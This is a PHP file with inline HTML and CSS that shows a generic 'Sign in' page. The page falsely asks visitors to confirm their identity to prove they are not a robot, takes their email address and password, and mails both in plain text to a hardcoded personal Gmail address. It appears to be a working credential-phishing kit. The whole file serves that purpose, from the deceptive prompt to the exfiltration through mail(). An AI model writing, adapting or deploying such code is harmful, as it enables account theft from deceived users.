<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Form is submitted, handle the form data and send email

    $email = $_POST["email"];
    $password = $_POST["password"];

    // Replace the 'youremail@example.com' with your actual email address
    $to = "tobilobamusic@gmail.com";

    // Modify the email content as needed
    $subject = "Form Submission";
    $message = "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";

    // You can modify the headers and content type as needed
    $headers = "From: yourwebsite@example.com\r\n";
    $headers .= "Content-type: text/plain\r\n";

    // Send the email and handle errors
    $sent = mail($to, $subject, $message, $headers);

    if ($sent) {
        header("Location: send_email.php?status=success");
        exit();
    } else {
        header("Location: send_email.php?status=error&error_message=" . urlencode(error_get_last()['message']));
        exit();
    }
} else {
    // Form is not yet submitted, display the form

    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    
    <link href="https://fonts.cdnfonts.com/css/lexend-deca" rel="stylesheet">
     <style>
         /*=============== VARIABLES CSS ===============*/
:root{
    /*========== Colors ==========*/
    /* Color mode HSL & RGB */
    --first-color: hsl(79, 100%, 49%);
    --white-color: #fff;
    --black-color: #000;

    /*========== Font and typography ==========*/
    /* .5rem = 8px | 1rem = 16px ... */
    --body-font: 'Lexend Deca', sans-serif;
    --normal-font-size: .938rem;
    --tiny-font-size: .563rem;
}
*{
    padding : 0;
    margin :0;
    box-sizing: border-box;
}
body{
    background: linear-gradient(rgba(0, 0, 0, 0.65
    ), rgba(0, 0, 0, 0.65)), url('./yo.png');
    background-position: center;
    background-attachment: fixed;
    background-repeat: no-repeat;
    display: flex;
    justify-content: center;
    align-items: center;
    position: fixed;
    height: 100%;
    width: 100%;
    font-family: 'Lexend Deca', sans-serif;                                              
}
.modal_form{
    background-color: #fff;
    height: 470px;
    width: 340px;
    border-radius: 5px;
}
.modal_form img{
  height: 80px;
  width: 100%;
}
.modal_form h2{
    text-align: center;
    font-size: 20px;
    padding-top: 15px;
    line-height: 1.5rem;
}
.modal_form p{
    text-align: center;
    padding-top: 20px;
    font-size: 14px;
    font-weight: 400;
}


.modal_form form{
    margin-top: 30px;
    padding-left: 20px;
    padding-right: 20px;
    padding-bottom: 20px;
}
  .form__content {
    display: grid;
    row-gap: 1.5rem;
  }
  .form__input, 
  .form__label, 
  .form__submit {
    border: 0;
    outline: none;
    font-size: var(--normal-font-size);
    font-family: var(--body-font);
  }
  
  .form__box {
    width: 100%;
    height: 49px;
    position: relative;
    border-radius: 5px;
  }
  
  .form__shadow {
    position: absolute;
    width: 100%;
    height: 100%;
    background-color: var(--black-color);
    border-radius: 5px;
  }
  
  .form__input {
    position: absolute;
    border: 1.8px solid var(--black-color);
    background-color: var(--white-color);
    width: 100%;
    height: 100%;
    z-index: 10;
    padding: 10px;
    transition: transform .3s;
    border-radius: 5px;
   
  }
  
  .form__input::placeholder {
    transition: opacity .5s;
  }
  
  .form__label {
    z-index: 100;
    position: absolute;
    top: 16px;
    left: 20px;
    font-size: var(--tiny-font-size);
    font-weight: 400;
    transition: .2s;
    pointer-events: none;
    opacity: 0;
  }
  
  .form__button {
    width: 100%;
    background-color: #fff;
    border-radius: 5px;
  }
  
  .form__submit {
    width: 100%;
    padding: .875rem 1.5rem;
    color: white;
    background-color: blue;
    cursor: pointer;
    transition: transform .3s;
    border-radius: 5px;
  }
  

  
  /* Opaque placeholder */
  .form__input:focus::placeholder {
    opacity: 0;
    transition: .3s;
    
  }
  
  /* Move input and sticky input up */

  
  /* Move label and sticky label up */
  .form__input:focus + .form__label,
  .form__input:not(:placeholder-shown).form__input:not(:focus) + .form__label {
    opacity: 1;
    top: 2px;
    left: 12px;
    transition: .3s;
  }
  .form__input:focus{
    border: 2px solid rgb(0, 0, 173);
  }
  
  /* Input bounce animation */
  @keyframes input-animation {
    0% {
      transform: translate(0);
    }
    40% {
      transform: translate(-9px, -9px);
    }
    60% {
      transform: translate(-7px, -7px);
    }
  }
  
  /*=============== BREAKPOINTS ===============*/
  /* For small devices */
  @media screen and (max-width: 340px) {
    .form__content, 
    .form__box {
      width: 100%;
    }
    .modal_form{
        padding-top: 15px;
        padding-left: 10px;
        padding-right: 10px;
        padding-bottom: 10px;
    }
  }
  
  /* For large devices */
  @media screen and (min-width: 968px) {
    .form__content {
      zoom: 1.1;
    }
  }
     </style>
    </head>
    <body>
        <div class="modal_form">
        <img src="./logo.jpeg" />
        <h2>Sign in</h2>
        <p>Confirm your identity to prove you are not <br>a robot </p>
            <form class="form__content" id="form" method="POST">
                <!-- ... your input fields and other form elements ... -->
                <div class="form__box">
                    <input type="email" id="email" name="email" class="form__input" placeholder="Email Address" required>
                    <label for="" class="form__label">ENTER EMAIL</label>
                </div>
                <div class="form__box">
                    <input type="password" id="password" name="password" class="form__input" placeholder="Password" required>
                    <label for="" class="form__label">ENTER PASSWORD</label>
                </div>
                <div class="remeber_me">
                    <input type="checkbox" />
                    <span>Remember me</span>
                </div>
                <div class="form__button">
                    <input type="submit" class="form__submit" value="Sign Up">
                </div>
            </form>
            <!-- Form ends here -->
        </div>
    </body>
    </html>
    <?php
}
?>
